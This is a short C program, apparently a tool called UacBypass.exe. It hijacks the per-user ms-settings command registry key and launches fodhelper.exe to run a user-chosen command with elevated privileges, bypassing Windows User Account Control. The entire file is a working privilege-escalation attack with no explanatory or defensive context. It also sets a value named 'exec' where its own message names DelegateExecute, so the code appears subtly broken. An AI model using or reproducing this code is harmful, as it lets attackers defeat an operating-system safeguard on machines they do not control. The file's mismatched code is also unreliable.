#include <windows.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: UacBypass.exe <file.exe or command>\n");
        return 1;
    }

    const wchar_t* userInput = argv[1];
    HKEY hkey;
    DWORD d;

    const wchar_t* settings = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const wchar_t* del = L"";

    LSTATUS stat = RegCreateKeyExW(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    if (stat != ERROR_SUCCESS) {
        wprintf(L"Failed to open or create reg key\n");
        return 1;
    } else {
        wprintf(L"Reg key: OK.\n");
    }

    stat = RegSetValueExW(hkey, L"", 0, REG_SZ, (const BYTE*)userInput, (DWORD)((wcslen(userInput) + 1) * sizeof(wchar_t)));
    if (stat != ERROR_SUCCESS) {
        wprintf(L"Failed to set reg value\n");
        RegCloseKey(hkey);
        return 1;
    } else {
        wprintf(L"Reg value: OK.\n");
    }

    stat = RegSetValueExW(hkey, L"exec", 0, REG_SZ, (const BYTE*)del, (DWORD)((wcslen(del) + 1) * sizeof(wchar_t)));
    if (stat != ERROR_SUCCESS) {
        wprintf(L"Failed to set DelegateExecute value\n");
        RegCloseKey(hkey);
        return 1;
    } else {
        wprintf(L"Reg value: exec OK.\n");
    }

    RegCloseKey(hkey);

    Sleep(5000);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED) {
            wprintf(L"The user refused to allow privileges elevation.\n");
        } else {
            wprintf(L"Unexpected error! Error code: %ld\n", err);
        }
    } else {
        wprintf(L"Execution successful.\n");
    }

    return 0;
}
